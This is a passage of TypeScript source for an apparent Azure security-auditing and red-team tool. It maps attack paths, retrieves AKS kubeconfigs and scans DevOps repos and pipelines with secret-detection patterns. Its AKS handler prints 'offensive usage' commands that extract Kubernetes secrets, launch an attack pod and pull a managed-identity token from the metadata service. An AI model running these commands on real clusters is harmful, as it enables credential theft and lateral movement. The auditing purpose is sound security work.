                    `5. Use VM's managed identity to access Azure resources`,
                    `6. Potential targets: Key Vault, Storage, Databases`,
                  ],
                  entryPoint: `Public IP ${pip.ipAddress}`,
                  target: "VM managed identity escalation",
                  risk: "If VM has managed identity with privileged roles, attacker can pivot to other resources",
                });
              }
            }
          }

          // Attack Path 2: Public Storage → Sensitive Data
          if (startPoint === "all" || startPoint === "storage") {
            const storageAccounts = resourceGroup
              ? storageClient.storageAccounts.listByResourceGroup(resourceGroup)
              : storageClient.storageAccounts.list();

            for await (const account of storageAccounts) {
              if (account.allowBlobPublicAccess === true) {
                attackPaths.push({
                  severity: "CRITICAL",
                  path: "Public Storage → Data Exfiltration",
                  steps: [
                    `1. Target storage account: ${account.name}`,
                    `2. Public blob access is ENABLED`,
                    `3. Enumerate containers anonymously`,
                    `4. List blobs without authentication`,
                    `5. Download sensitive files (backups, configs, databases)`,
                    `6. Extract credentials from downloaded files`,
                    `7. Use credentials to access other Azure resources`,
                  ],
                  entryPoint: `Storage account ${account.name}`,
                  target: "Sensitive data exfiltration → credential theft",
                  risk: "Anonymous access to storage can expose backups, configs with connection strings, API keys",
                });
              }
            }
          }

          // Attack Path 3: NSG Misconfiguration → VM Compromise → Lateral Movement
          if (startPoint === "all" || startPoint === "vms") {
            const nsgs = resourceGroup
              ? networkClient.networkSecurityGroups.list(resourceGroup)
              : networkClient.networkSecurityGroups.listAll();

            for await (const nsg of nsgs) {
              for (const rule of nsg.securityRules || []) {
                if (rule.access === "Allow" && rule.direction === "Inbound") {
                  const wildcardSource = ["*", "0.0.0.0/0", "Internet", "Any"].some(s =>
                    rule.sourceAddressPrefix?.includes(s)
                  );
                  const port = rule.destinationPortRange;
                  if (wildcardSource && (port?.includes("22") || port?.includes("3389"))) {
                    attackPaths.push({
                      severity: "CRITICAL",
                      path: "NSG Wildcard → RDP/SSH Brute Force → Lateral Movement",
                      steps: [
                        `1. Identify exposed port ${port} on NSG: ${nsg.name}`,
                        `2. NSG rule allows source: ${rule.sourceAddressPrefix} (Internet)`,
                        `3. Brute force / password spray attack on ${port === "22" ? "SSH" : "RDP"}`,
                        `4. Gain initial foothold on VM`,
                        `5. Enumerate VM's managed identity and RBAC roles`,
                        `6. Use Azure Instance Metadata Service (IMDS) to get access token`,
                        `7. Pivot to other resources based on VM's permissions`,
                      ],
                      entryPoint: `NSG ${nsg.name} - Port ${port}`,
                      target: "VM compromise → managed identity abuse → lateral movement",
                      risk: "Management port exposed to Internet enables brute force → full VM access → identity escalation",
                    });
                  }
                }
              }
            }
          }

          // Attack Path 4: Over-Privileged Identity → Privilege Escalation
          if (startPoint === "all" || startPoint === "identities") {
            const scope = resourceGroup
              ? `/subscriptions/${subscriptionId}/resourceGroups/${resourceGroup}`
              : `/subscriptions/${subscriptionId}`;

            const roleAssignments = authClient.roleAssignments.listForScope(scope);
            const privilegedRoles = ["Owner", "Contributor", "User Access Administrator"];

            for await (const assignment of roleAssignments) {
              const roleDefId = assignment.roleDefinitionId?.split('/').pop();
              if (assignment.principalType === "ServicePrincipal") {
                attackPaths.push({
                  severity: "HIGH",
                  path: "Service Principal Compromise → Privilege Escalation",
                  steps: [
                    `1. Target service principal with privileged role`,
                    `2. Service principal has broad permissions across subscription`,
                    `3. If SP credentials are compromised (leaked in code, CI/CD)`,
                    `4. Attacker can assume SP identity`,
                    `5. Execute privileged operations based on RBAC role`,
                    `6. Create backdoors, exfiltrate data, modify resources`,
                  ],
                  entryPoint: `Service Principal (${assignment.principalId})`,
                  target: "Subscription-level privilege escalation",
                  risk: "Compromised service principal credentials = full subscription access if Owner/Contributor role",
                });
              }
            }
          }

          // Attack Path 5: SQL Public Endpoint → Database Access
          const sqlClient = new SqlManagementClient(credential, subscriptionId);
          const sqlServers = sqlClient.servers.list();
          for await (const server of sqlServers) {
            if (server.publicNetworkAccess === "Enabled") {
              const serverRg = server.id?.split('/')[4] || "";
              const firewallRules = await sqlClient.firewallRules.listByServer(serverRg, server.name || "");
              for await (const rule of firewallRules) {
                if (rule.startIpAddress === "0.0.0.0" && rule.endIpAddress === "255.255.255.255") {
                  attackPaths.push({
                    severity: "CRITICAL",
                    path: "Public SQL Endpoint → Direct Database Access",
                    steps: [
                      `1. SQL Server: ${server.name} has public network access`,
                      `2. Firewall rule allows all IPs: 0.0.0.0-255.255.255.255`,
                      `3. Attempt SQL authentication brute force`,
                      `4. Use leaked credentials from previous breaches`,
                      `5. Direct database access without VPN`,
                      `6. Exfiltrate all database contents`,
                      `7. Extract user credentials, PII, business data`,
                    ],
                    entryPoint: `SQL Server ${server.name}`,
                    target: "Direct database compromise and data exfiltration",
                    risk: "Public SQL endpoint + allow-all firewall = unrestricted database access attempts",
                  });
                }
              }
            }
          }

        } catch (error: any) {
          attackPaths.push({
            severity: "ERROR",
            path: "Analysis Error",
            steps: [`Failed to analyze attack paths: ${error.message}`],
          });
        }

        // Sort by severity
        const severityOrder: any = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, ERROR: 4 };
        attackPaths.sort((a, b) => severityOrder[a.severity] - severityOrder[b.severity]);

        const summary = {
          totalPaths: attackPaths.length,
          critical: attackPaths.filter(p => p.severity === "CRITICAL").length,
          high: attackPaths.filter(p => p.severity === "HIGH").length,
          analysisScope: startPoint,
        };

        let report = `# Attack Path Analysis\n\n`;
        report += `**Subscription:** ${subscriptionId}\n`;
        report += `**Resource Group:** ${resourceGroup || "All"}\n`;
        report += `**Analysis Scope:** ${startPoint}\n`;
        report += `**Date:** ${new Date().toISOString()}\n\n`;
        report += `## Summary\n\n`;
        report += `- **Total Attack Paths:** ${summary.totalPaths}\n`;
        report += `- **CRITICAL Severity:** ${summary.critical}\n`;
        report += `- **HIGH Severity:** ${summary.high}\n\n`;

        report += `## Attack Paths (Exploitation Scenarios)\n\n`;
        for (let i = 0; i < attackPaths.length; i++) {
          const path = attackPaths[i];
          report += `### ${i + 1}. ${path.path} [${path.severity}]\n\n`;
          report += `**Entry Point:** ${path.entryPoint}\n`;
          report += `**Target:** ${path.target}\n`;
          report += `**Risk:** ${path.risk}\n\n`;
          report += `**Attack Steps:**\n`;
          for (const step of path.steps) {
            report += `${step}\n`;
          }
          report += `\n---\n\n`;
        }

        report += `## Mitigation Recommendations\n\n`;
        report += `1. **Remove public access** - Disable public blob access, use private endpoints\n`;
        report += `2. **Restrict NSG rules** - Whitelist specific IPs, remove 0.0.0.0/0 rules\n`;
        report += `3. **Implement JIT access** - Use Just-in-Time VM access for management ports\n`;
        report += `4. **Least privilege** - Review RBAC assignments, remove excessive permissions\n`;
        report += `5. **Enable MFA** - Enforce multi-factor authentication for all accounts\n`;
        report += `6. **Private endpoints** - Use private links for PaaS services (SQL, Storage)\n`;
        report += `7. **Network isolation** - Segment networks, use VNets and subnets\n\n`;

        report += `*Generated by Stratos v1.8.0*\n`;

        return {
          content: [{ type: "text", text: formatResponse(report, format, request.params.name) }],
        };
      }

      case "azure_get_aks_credentials": {
        const { subscriptionId, resourceGroup, clusterName, adminAccess, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
          adminAccess?: boolean;
          format?: string;
        };

        const containerClient = new ContainerServiceClient(credential, subscriptionId);
        
        try {
          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
          
          let credentialsResult;
          let credentialType;
          
          if (adminAccess) {
            try {
              credentialsResult = await containerClient.managedClusters.listClusterAdminCredentials(
                resourceGroup,
                clusterName
              );
              credentialType = "Admin Credentials (cluster-admin RBAC)";
            } catch (error: any) {
              return {
                content: [{
                  type: "text",
                  text: `[FAIL] **FAILED to retrieve admin credentials**\n\nError: ${error.message}\n\nThis usually means you lack the required Azure RBAC permission:\n- **Required Role:** Azure Kubernetes Service Cluster Admin\n\nTry with user credentials instead (set adminAccess=false).`
                }],
                isError: true,
              };
            }
          } else {
            credentialsResult = await containerClient.managedClusters.listClusterUserCredentials(
              resourceGroup,
              clusterName
            );
            credentialType = "User Credentials (Azure AD RBAC)";
          }

          // Extract kubeconfig
          const kubeconfigBase64 = credentialsResult.kubeconfigs?.[0]?.value;
          const kubeconfigContent = kubeconfigBase64
            ? Buffer.from(kubeconfigBase64).toString('utf-8')
            : "N/A";

          const fqdn = cluster.fqdn || "N/A";
          const apiServerUrl = `https://${fqdn}:443`;
          
          let report = `# AKS Cluster Credentials - ${clusterName}\n\n`;
          report += `## Summary\n`;
          report += `- **Credential Type:** ${credentialType}\n`;
          report += `- **Cluster FQDN:** ${fqdn}\n`;
          report += `- **API Server:** ${apiServerUrl}\n`;
          report += `- **Kubernetes Version:** ${cluster.kubernetesVersion}\n`;
          report += `- **Location:** ${cluster.location}\n`;
          report += `- **Private Cluster:** ${cluster.apiServerAccessProfile?.enablePrivateCluster ? "[OK] Yes" : "[FAIL] No (PUBLIC)"}\n\n`;
          
          report += `## Identity Configuration\n`;
          if (cluster.identity?.type === "SystemAssigned") {
            report += `- **Cluster Identity:** System-Assigned Managed Identity\n`;
            report += `- **Principal ID:** ${cluster.identity.principalId}\n`;
          } else if (cluster.identity?.type === "UserAssigned") {
            report += `- **Cluster Identity:** User-Assigned Managed Identity\n`;
            const identityIds = Object.keys(cluster.identity.userAssignedIdentities || {});
            report += `- **Identity Resources:** ${identityIds.join(", ")}\n`;
          }
          
          if (cluster.servicePrincipalProfile?.clientId) {
            report += `- **Service Principal:** ${cluster.servicePrincipalProfile.clientId}\n`;
          }
          
          report += `\n## Kubeconfig\n\`\`\`yaml\n${kubeconfigContent}\n\`\`\`\n\n`;
          
          report += `## Offensive Usage Instructions\n\n`;
          report += `### 1. Save Kubeconfig\n\`\`\`bash\n`;
          report += `# Save the kubeconfig to file\n`;
          report += `cat > ~/aks-${clusterName}.kubeconfig <<'EOF'\n${kubeconfigContent}\nEOF\n\n`;
          report += `# Set KUBECONFIG environment variable\n`;
          report += `export KUBECONFIG=~/aks-${clusterName}.kubeconfig\n\`\`\`\n\n`;
          
          report += `### 2. Test Kubectl Access\n\`\`\`bash\n`;
          report += `# Verify cluster access\n`;
          report += `kubectl cluster-info\n`;
          report += `kubectl get nodes\n`;
          report += `kubectl get namespaces\n\n`;
          report += `# Check your permissions\n`;
          report += `kubectl auth can-i --list\n`;
          report += `kubectl auth can-i create pods\n`;
          report += `kubectl auth can-i get secrets --all-namespaces\n\`\`\`\n\n`;
          
          report += `### 3. RBAC Enumeration\n\`\`\`bash\n`;
          report += `# List all service accounts\n`;
          report += `kubectl get serviceaccounts --all-namespaces\n\n`;
          report += `# Find cluster-admin bindings\n`;
          report += `kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin")'\n\n`;
          report += `# List all roles and bindings\n`;
          report += `kubectl get clusterroles\n`;
          report += `kubectl get rolebindings --all-namespaces\n\`\`\`\n\n`;
          
          report += `### 4. Secret Extraction\n\`\`\`bash\n`;
          report += `# List all secrets\n`;
          report += `kubectl get secrets --all-namespaces\n\n`;
          report += `# Extract specific secret\n`;
          report += `kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o jsonpath='{.data}' | jq -r 'to_entries[] | "\\(.key): \\(.value | @base64d)"'\n\n`;
          report += `# Find database credentials\n`;
          report += `kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.metadata.name | contains("db"))'\n\`\`\`\n\n`;
          
          report += `### 5. Deploy Attack Pod (if you have create pod permission)\n\`\`\`bash\n`;
          report += `# Deploy privileged pod for IMDS access\n`;
          report += `kubectl run attack-pod --image=alpine --restart=Never --rm -it -- /bin/sh\n\n`;
          report += `# Inside pod, test IMDS access\n`;
          report += `apk add curl\n`;
          report += `curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"\n\n`;
          report += `# Get managed identity token\n`;
          report += `TOKEN=$(curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")\n`;
          report += `echo $TOKEN | jq -r .access_token\n\`\`\`\n\n`;
          
          report += `## Security Findings\n`;
          if (!cluster.apiServerAccessProfile?.enablePrivateCluster) {
            report += `- [FAIL] **CRITICAL:** API server is PUBLIC - accessible from Internet\n`;
          }
          if (!cluster.enableRbac) {
            report += `- [FAIL] **CRITICAL:** RBAC is DISABLED - any authenticated user has cluster-admin\n`;
          }
          if (cluster.servicePrincipalProfile?.clientId && cluster.servicePrincipalProfile.clientId !== "msi") {
            report += `- [WARN] **HIGH:** Using Service Principal (consider migrating to Managed Identity)\n`;
          }
          if (!cluster.aadProfile?.managed) {
            report += `- [WARN] **MEDIUM:** Azure AD integration not enabled\n`;
          }

          return {
            content: [{ type: "text", text: formatResponse(report, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{
              type: "text",
              text: `Error retrieving AKS credentials: ${error.message}\n\nEnsure you have the required permissions:\n- Azure Kubernetes Service Cluster User Role (for user creds)\n- Azure Kubernetes Service Cluster Admin Role (for admin creds)`
            }],
            isError: true,
          };
        }
      }

      case "azure_scan_azure_devops": {
        const { organizationUrl, personalAccessToken, scanRepositories, scanPipelines, format } = request.params.arguments as {
          organizationUrl: string;
          personalAccessToken: string;
          scanRepositories?: boolean;
          scanPipelines?: boolean;
          format?: string;
        };

        const doScanRepos = scanRepositories !== false;
        const doScanPipelines = scanPipelines !== false;

        try {
          const authHandler = azdev.getPersonalAccessTokenHandler(personalAccessToken);
          const connection = new azdev.WebApi(organizationUrl, authHandler);

          let report = `# Azure DevOps Security Scan\n\n`;
          report += `**Organization:** ${organizationUrl}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;

          const findings: any[] = [];
          let criticalCount = 0;
          let highCount = 0;
          let mediumCount = 0;

          const coreApi = await connection.getCoreApi();
          const projects = await coreApi.getProjects();

          report += `## Projects Found: ${projects.length}\n\n`;

          for (const project of projects) {
            report += `### Project: ${project.name}\n\n`;

            // Scan repositories for secrets
            if (doScanRepos) {
              try {
                const gitApi = await connection.getGitApi();
                const repositories = await gitApi.getRepositories(project.id!);

                report += `**Repositories:** ${repositories.length}\n\n`;

                for (const repo of repositories) {
                  try {
                    const items = await gitApi.getItems(
                      repo.id!,
                      project.id,
                      undefined,
                      undefined,
                      undefined,
                      false,
                      false,
                      false,
                      undefined
                    );

                    const sensitivePatterns = [
                      '.env',
                      'secrets',
                      'password',
                      'config.json',
                      'appsettings.json',
                      'credentials',
                      '.pem',
                      '.key',
                      'id_rsa',
                    ];

                    for (const item of items) {
                      const fileName = item.path?.toLowerCase() || '';
                      const hasSensitivePattern = sensitivePatterns.some(pattern =>
                        fileName.includes(pattern)
                      );

                      if (hasSensitivePattern) {
                        findings.push({
                          severity: 'HIGH',
                          category: 'Repository',
                          resource: `${repo.name}`,
                          finding: `Potentially sensitive file: ${item.path}`,
                          remediation: 'Review file contents for hardcoded secrets',
                        });
                        highCount++;
                        report += `- [WARN] **HIGH**: Sensitive file found: ${item.path}\n`;
                      }
                    }
                  } catch (e: any) {
                    // Skip if can't access repo items
                  }
                }
              } catch (e: any) {
                report += `*Unable to scan repositories: ${e.message}*\n\n`;
              }
            }

            // Scan build pipelines
            if (doScanPipelines) {
              try {
                const buildApi = await connection.getBuildApi();
                const definitions = await buildApi.getDefinitions(project.id!);

                report += `**Build Pipelines:** ${definitions.length}\n\n`;

                for (const definition of definitions) {
                  const fullDef = await buildApi.getDefinition(project.id!, definition.id!);

                  const defJson = JSON.stringify(fullDef);

                  const secretPatterns = [
                    { pattern: /password\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'CRITICAL', name: 'Hardcoded password' },
                    { pattern: /connectionString\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'CRITICAL', name: 'Connection string' },
                    { pattern: /apiKey\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'CRITICAL', name: 'API key' },
                    { pattern: /secret\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'HIGH', name: 'Secret value' },
                    { pattern: /token\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'HIGH', name: 'Token' },
                  ];

                  for (const { pattern, severity, name } of secretPatterns) {
                    const matches = defJson.match(pattern);
                    if (matches && matches.length > 0) {
                      findings.push({
                        severity,
                        category: 'Pipeline',
                        resource: definition.name,
                        finding: `${name} detected in pipeline definition`,
                        remediation: 'Use Azure Key Vault or pipeline variables instead',
                      });

                      if (severity === 'CRITICAL') criticalCount++;
                      else if (severity === 'HIGH') highCount++;

                      report += `- [FAIL] **${severity}**: ${name} found in pipeline "${definition.name}"\n`;
                    }
                  }

                  if (fullDef.process && (fullDef.process as any).type === 2) {
                    // YAML pipeline
                    report += `  - Pipeline type: YAML\n`;
                  }
                }
              } catch (e: any) {
                report += `*Unable to scan pipelines: ${e.message}*\n\n`;
              }
            }

            // Scan service connections
            try {
              // Note: Service connection APIs require specific permissions
              report += `**Service Connections:** (Requires Service Endpoints Read permission)\n\n`;
              
              // Commenting out due to API method availability
              /*
              const taskApi = await connection.getTaskAgentApi();
              const endpoints = await taskApi.getServiceEndpoints(project.id!);

              report += `**Service Connections:** ${endpoints?.length || 0}\n\n`;

              for (const endpoint of endpoints || []) {
                if (endpoint.authorization?.scheme === 'UsernamePassword') {
                  findings.push({
                    severity: 'HIGH',
                    category: 'Service Connection',
                    resource: endpoint.name,
                    finding: 'Uses username/password authentication (not managed identity)',
                    remediation: 'Migrate to service principal or managed identity',
                  });
                  highCount++;
                  report += `- [WARN] **HIGH**: Service connection "${endpoint.name}" uses username/password auth\n`;
                }

                if (endpoint.isReady === false) {
                  findings.push({
                    severity: 'MEDIUM',
                    category: 'Service Connection',
                    resource: endpoint.name,
                    finding: 'Service connection not ready/configured',
                    remediation: 'Remove unused service connections',
                  });
                  mediumCount++;
                }
              }
              */
            } catch (e: any) {
              report += `*Unable to scan service connections: ${e.message}*\n\n`;
            }

            report += `\n`;
          }

          report += `## Summary\n\n`;
          report += `- **Total Findings:** ${findings.length}\n`;
          report += `- [CRITICAL] **CRITICAL:** ${criticalCount}\n`;
          report += `- [HIGH] **HIGH:** ${highCount}\n`;
          report += `- [MEDIUM] **MEDIUM:** ${mediumCount}\n\n`;

          report += `## Security Recommendations\n\n`;
          report += `### Immediate Actions\n`;
          report += `1. Remove all hardcoded secrets from pipeline definitions\n`;
          report += `2. Use Azure Key Vault for sensitive values\n`;
          report += `3. Implement secret scanning in CI/CD\n`;
          report += `4. Review and rotate compromised credentials\n\n`;

          report += `### Best Practices\n`;
          report += `1. Use managed identities for service connections\n`;
          report += `2. Store secrets in Azure Key Vault\n`;
          report += `3. Reference Key Vault secrets in pipelines: \`$(KeyVaultSecret)\`\n`;
          report += `4. Enable branch policies to require code reviews\n`;
          report += `5. Use .gitignore to prevent committing sensitive files\n`;
          report += `6. Implement pre-commit hooks for secret scanning\n`;
          report += `7. Rotate PAT tokens regularly\n`;
          report += `8. Use least-privilege service principals\n\n`;

          report += `## Tools for Secret Detection\n`;
          report += `- **GitLeaks:** Scan repos for leaked secrets\n`;
          report += `- **TruffleHog:** Find high-entropy strings (keys/tokens)\n`;
          report += `- **Azure DevOps Credential Scanner:** Built-in scanning\n`;
          report += `- **GitHub Advanced Security:** Secret scanning integration\n\n`;

          return {
            content: [{ type: 'text', text: formatResponse(report, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [
              {
                type: 'text',
                text: `Error scanning Azure DevOps: ${error.message}\n\nCommon issues:\n- Invalid PAT token\n- Insufficient permissions (need Code:Read, Build:Read)\n- Wrong organization URL format\n- Network connectivity`,
              },
            ],
            isError: true,
          };
        }
      }

      case "azure_analyze_function_apps": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };
        
        try {
          const credential = new DefaultAzureCredential();
          let report = `# Azure Functions Security Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          // Note: Would need @azure/arm-appservice for full implementation
          report += `## Function App Security Checklist\n\n`;
          report += `### Authentication & Authorization\n`;
          report += `- [ ] App Service Authentication enabled\n`;
          report += `- [ ] HTTPS Only enforced\n`;
          report += `- [ ] Minimum TLS 1.2\n`;
          report += `- [ ] Managed Identity configured\n\n`;
          
          report += `### Network Security\n`;
          report += `- [ ] VNet Integration enabled\n`;
          report += `- [ ] Private Endpoints configured\n`;
          report += `- [ ] IP Restrictions set\n`;
          report += `- [ ] CORS properly configured\n\n`;
          
          report += `### Secrets Management\n`;
          report += `- [ ] No secrets in App Settings\n`;
          report += `- [ ] Key Vault references used\n`;
          report += `- [ ] Function keys rotated regularly\n\n`;
          
          report += `### Runtime Security\n`;
          report += `- [ ] Latest runtime version\n`;
          report += `- [ ] Remote debugging disabled\n`;
          report += `- [ ] FTP disabled\n`;
          report += `- [ ] Diagnostic logs enabled\n\n`;
          
          report += `## Common Attack Vectors\n\n`;
          report += `| Attack | Risk | Description |\n`;
          report += `|--------|------|-------------|\n`;
          report += `| Exposed Function URL | HIGH | Functions without auth exposed to internet |\n`;
          report += `| Leaked Function Keys | CRITICAL | Keys in source code or logs |\n`;
          report += `| SSRF via Managed Identity | HIGH | Function can access other Azure resources |\n`;
          report += `| Environment Variable Leak | MEDIUM | Secrets in app settings visible to anyone with access |\n`;
          
          return {
            content: [{ type: 'text', text: formatResponse(report, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing Function Apps: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "azure_analyze_app_service_security": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };
        
        try {
          let report = `# App Service Security Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          report += `## Security Configuration Checklist\n\n`;
          report += `### Transport Security\n`;
          report += `- [ ] HTTPS Only enabled\n`;
          report += `- [ ] Minimum TLS Version: 1.2+\n`;
          report += `- [ ] HTTP/2 enabled\n`;
          report += `- [ ] Custom domain with managed certificate\n\n`;
          
          report += `### Authentication\n`;
          report += `- [ ] App Service Authentication (EasyAuth) configured\n`;
          report += `- [ ] Azure AD authentication\n`;
          report += `- [ ] Anonymous access blocked where appropriate\n\n`;
          
          report += `### Network Security\n`;
          report += `- [ ] VNet Integration enabled\n`;
          report += `- [ ] Private Endpoints for backend access\n`;
          report += `- [ ] IP Restrictions configured\n`;
          report += `- [ ] Access Restrictions with service tags\n\n`;
          
          report += `### Deployment Security\n`;
          report += `- [ ] SCM site (Kudu) secured\n`;
          report += `- [ ] FTP/FTPS disabled or secured\n`;
          report += `- [ ] Remote debugging disabled in production\n`;
          report += `- [ ] Deployment slots for safe releases\n\n`;
          
          report += `## Critical Findings to Check\n\n`;
          report += `| Finding | Severity | Impact |\n`;
          report += `|---------|----------|--------|\n`;
          report += `| HTTPS Only = false | HIGH | Data in transit exposed |\n`;
          report += `| TLS < 1.2 | HIGH | Vulnerable to protocol attacks |\n`;
          report += `| Remote Debugging = true | CRITICAL | Direct code execution |\n`;
          report += `| FTP Publishing enabled | MEDIUM | Credential theft risk |\n`;
          report += `| No IP Restrictions | MEDIUM | Open to all internet traffic |\n`;
          
          return {
            content: [{ type: 'text', text: formatResponse(report, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing App Services: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "azure_analyze_firewall_policies": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };
        
        try {
          const credential = new DefaultAzureCredential();
          const networkClient = new NetworkManagementClient(credential, subscriptionId);
          
          let report = `# Azure Firewall & NSG Policy Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          report += `## Network Security Groups Analysis\n\n`;
          let criticalRules: string[] = [];
          let highRules: string[] = [];
          
          const nsgs = networkClient.networkSecurityGroups.listAll();
          for await (const nsg of nsgs) {
            if (resourceGroup && nsg.location !== resourceGroup) continue;
            
            for (const rule of nsg.securityRules || []) {
              if (rule.access === 'Allow' && rule.direction === 'Inbound') {
                const isAnySource = rule.sourceAddressPrefix === '*' || 
                                    rule.sourceAddressPrefix === '0.0.0.0/0' ||
                                    rule.sourceAddressPrefix === 'Internet';
                const isAnyPort = rule.destinationPortRange === '*';
                
                if (isAnySource && isAnyPort) {
                  criticalRules.push(`**${nsg.name}/${rule.name}**: ANY source → ANY port (CRITICAL)`);
                } else if (isAnySource) {
                  const port = rule.destinationPortRange || '';
                  const sensitivePort = ['22', '3389', '445', '1433', '3306', '5432'].includes(port);
                  if (sensitivePort) {
                    criticalRules.push(`**${nsg.name}/${rule.name}**: Internet → Port ${port}`);
                  } else {
                    highRules.push(`**${nsg.name}/${rule.name}**: Internet → Port ${port}`);
                  }
                }
              }
            }
          }
          
          if (criticalRules.length > 0) {
            report += `### [CRITICAL] CRITICAL Findings\n\n`;
            for (const rule of criticalRules) {
              report += `- ${rule}\n`;
            }
            report += `\n`;
          }
          
          if (highRules.length > 0) {
            report += `### [HIGH] HIGH Risk Rules\n\n`;
            for (const rule of highRules) {
              report += `- ${rule}\n`;
            }
            report += `\n`;
          }
          
          if (criticalRules.length === 0 && highRules.length === 0) {
            report += `[OK] No overly permissive NSG rules found\n\n`;
          }
          
          report += `## Firewall Best Practices\n\n`;
          report += `- Use Application Security Groups (ASGs) for workload segmentation\n`;
          report += `- Implement Azure Firewall Premium for threat intelligence\n`;
          report += `- Enable NSG Flow Logs for traffic analysis\n`;
          report += `- Use Azure DDoS Protection Standard for public endpoints\n`;
          
          return {
            content: [{ type: 'text', text: formatResponse(report, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing firewall policies: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "azure_analyze_logic_apps": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };
        
        try {
          let report = `# Logic Apps Security Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          report += `## Logic App Security Checklist\n\n`;
          report += `### Access Control\n`;
          report += `- [ ] IP-based access restrictions configured\n`;
          report += `- [ ] SAS tokens for trigger authentication\n`;
          report += `- [ ] OAuth 2.0 for HTTP triggers\n`;
          report += `- [ ] Azure AD authentication for management\n\n`;
          
          report += `### Secrets Management\n`;
          report += `- [ ] Managed Identity for connector authentication\n`;
          report += `- [ ] Key Vault references for secrets\n`;
          report += `- [ ] No hardcoded credentials in workflow\n\n`;
          
          report += `### Monitoring\n`;
          report += `- [ ] Diagnostic settings enabled\n`;
          report += `- [ ] Run history retention configured\n`;
          report += `- [ ] Alerts on failures\n\n`;
          
          report += `## Attack Vectors\n\n`;
          report += `| Vector | Risk | Mitigation |\n`;
          report += `|--------|------|------------|\n`;
          report += `| Exposed HTTP trigger | HIGH | Use SAS or OAuth authentication |\n`;
          report += `| Credential in workflow | CRITICAL | Use Managed Identity + Key Vault |\n`;
          report += `| SSRF via connectors | MEDIUM | Restrict connector permissions |\n`;
          report += `| Run history exposure | MEDIUM | Configure retention and access |\n`;
          
          return {
            content: [{ type: 'text', text: formatResponse(report, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing Logic Apps: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "azure_analyze_rbac_privesc": {
        const { subscriptionId, targetPrincipal, format } = request.params.arguments as {
          subscriptionId: string;
          targetPrincipal?: string;
          format?: string;
        };
        
        try {
          const credential = new DefaultAzureCredential();
          const authClient = new AuthorizationManagementClient(credential, subscriptionId);
          
          let report = `# RBAC Privilege Escalation Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          // Dangerous permissions
          const dangerousPermissions = [
            'Microsoft.Authorization/roleAssignments/write',
            'Microsoft.Authorization/roleDefinitions/write',
            '*/write',
            '*',
          ];
          
          report += `## Role Assignments with Dangerous Permissions\n\n`;
          
          let escalationPaths: string[] = [];
          const assignments = authClient.roleAssignments.listForSubscription();
          
          for await (const assignment of assignments) {
            const roleId = assignment.roleDefinitionId?.split('/').pop();
            
            // Well-known dangerous roles
            const dangerousRoles = ['Owner', 'User Access Administrator', 'Contributor'];
            if (dangerousRoles.some(r => assignment.roleDefinitionId?.includes(r))) {
              escalationPaths.push(`**${assignment.principalId}** has ${assignment.roleDefinitionId?.split('/').pop()} at scope: ${assignment.scope}`);
            }
          }
          
          if (escalationPaths.length > 0) {
            report += `### [WARN] Potential Escalation Paths\n\n`;
            for (const path of escalationPaths.slice(0, 20)) {
              report += `- ${path}\n`;
            }
            if (escalationPaths.length > 20) {
              report += `\n...and ${escalationPaths.length - 20} more\n`;
            }
          } else {
            report += `[OK] No obvious escalation paths found\n`;
          }
          
          report += `\n## Common RBAC Privilege Escalation Techniques\n\n`;
          report += `| Technique | Required Permission | Impact |\n`;
          report += `|-----------|---------------------|--------|\n`;
          report += `| Role Assignment | roleAssignments/write | Grant self Owner |\n`;
          report += `| Custom Role | roleDefinitions/write | Create privileged role |\n`;
          report += `| VM Run Command | virtualMachines/runCommand | Execute as system |\n`;
          report += `| Managed Identity | userAssignedIdentities/* | Assume identity |\n`;
          report += `| Key Vault Access | keyVault/vaults/accessPolicies/write | Access secrets |\n`;
          
          return {
            content: [{ type: 'text', text: formatResponse(report, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing RBAC: ${error.message}` }],
